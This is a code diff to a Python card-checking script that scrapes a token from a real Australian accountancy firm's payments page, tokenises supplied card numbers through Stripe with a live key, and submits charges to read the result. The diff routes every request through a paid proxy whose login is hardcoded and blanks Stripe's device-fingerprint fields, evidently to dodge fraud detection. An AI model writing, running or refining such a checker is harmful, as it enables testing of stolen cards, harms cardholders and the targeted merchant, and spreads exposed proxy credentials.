@@ -1,6 +1,10 @@
 import requests,re
+import random
+from proxy import reqproxy, make_request
 def Tele(ccx):
-	import requests
+	proxy_str = "ol-pro.porterproxies.com:7777:customer-PP_K3LIW0QTTL-cc-US:imv41dtg"
+	session, ip = reqproxy(proxy_str)
+	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -32,7 +36,7 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = requests.get('https://www.pbaccountant.com.au/payments', headers=headers)
+	response = session.get('https://www.pbaccountant.com.au/payments', headers=headers)
 	
 	RequestVerificationToken = re.search(r'name="__RequestVerificationToken" type="hidden" value="(.*?)"', response.text).group(1)
 	#print(RequestVerificationToken)
@@ -53,9 +57,9 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
 	
-	data = f'time_on_page=62388&guid=1e245c59-b3c1-4ff9-a09f-db1ae116ea9834ff9b&muid=9be692ec-080b-4770-9c3d-49976a98b32b7258f8&sid=db5cdfd8-03f4-4d15-bc2d-a15049fd9e9db7415b&key=pk_live_NqLPVp9OhWjmctcO4K5egggi&payment_user_agent=stripe.js%2F78ef418&card[name]=Dao+Khao+Saard&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]=20{yy}'
+	data = f'time_on_page=62388&guid=NA&muid=NA&sid=NA&key=pk_live_NqLPVp9OhWjmctcO4K5egggi&payment_user_agent=stripe.js%2F78ef418&card[name]=Dao+Khao+Saard&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]=20{yy}'
 	
-	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
+	response = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
 	
 	tok = response.json()['id']
 	
@@ -90,7 +94,7 @@ def Tele(ccx):
 	    'CardHolderName': 'Dao Khao Saard',
 	}
 	
-	response = requests.post('https://www.pbaccountant.com.au/Payments', headers=headers, data=data)
+	response = session.post('https://www.pbaccountant.com.au/Payments', headers=headers, data=data)
 	
 	result = re.search(r'<p class="Callout">(.*?)</p>', response.text).group(1)
 	return (result)
